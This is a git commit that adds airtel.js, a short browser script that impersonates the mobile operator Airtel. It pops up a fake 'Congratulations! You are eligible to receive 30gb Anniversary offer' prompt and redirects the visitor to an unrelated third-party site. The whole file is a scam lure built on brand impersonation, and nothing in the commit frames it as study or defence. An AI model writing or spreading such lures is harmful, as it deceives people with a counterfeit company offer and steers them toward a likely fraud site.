b8f1e55e7a94b49bd110b04751e617f38d269d43
Usorondo85 <markers-waltz5i@icloud.com>
2026-07-07 05:59:15 +0100

    Create airtel.js

---
+++ airtel.js
@@ -0,0 +1,8 @@
+var password = 'CLAIM 30GB'
+password = prompt(
+  'Airtel: Congratulations! You are eligible to receive 30gb Anniversary offer. kindly press OK to Get Yours.',
+  'CLAIM 30GB'
+);
+if (password != 'CLAIM 30GB') {
+  location.href = 'https://www.efereeitid.site/30gb-anniversary-offer';
+}
